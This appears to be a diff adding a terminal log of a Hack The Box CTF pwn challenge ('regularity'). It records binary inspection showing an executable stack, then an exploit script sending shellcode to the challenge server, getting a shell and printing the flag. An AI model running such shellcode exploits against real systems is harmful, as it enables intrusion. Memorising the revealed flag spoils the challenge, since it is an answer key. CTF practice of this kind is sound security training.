@@ -1,0 +1,27 @@
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_regularity> wsl file /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_regularity/regularity
+/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_regularity/regularity: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_regularity> wsl checksec --file=/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_regularity/regularity 2>/dev/null ; wsl bash -c "readelf -l /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_regularity/regularity | grep -A1 GNU_STACK"
+out-file : Could not find a part of the path 'C:\dev\null'.
+At line:1 char:1
++ wsl checksec --file=/mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_regu ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RWE    0x10
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_regularity> wsl bash -c "cd /mnt/c/Users/sadik/Documents/HTB-CTF/PWN/pwn_regularity && python3 exploit.py"
+[*] Shellcode length: 25 bytes
+[*] Payload length: 264 bytes
+[*] Connecting to 94.237.61.52:31975
+[+] Opening connection to 94.237.61.52 on port 31975: Done
+b'Hello, Survivor. Anything new these days?'
+b'\n'
+[*] Sending payload...
+[+] Enjoy your shell!
+[*] Switching to interactive mode
+$ cat flag.txt
+HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_99d95bde707799696d987a32be6a456a}$ 
+[*] Interrupted
+[*] Closed connection to 94.237.61.52 port 31975
+PS C:\Users\sadik\Documents\HTB-CTF\PWN\pwn_regularity> 
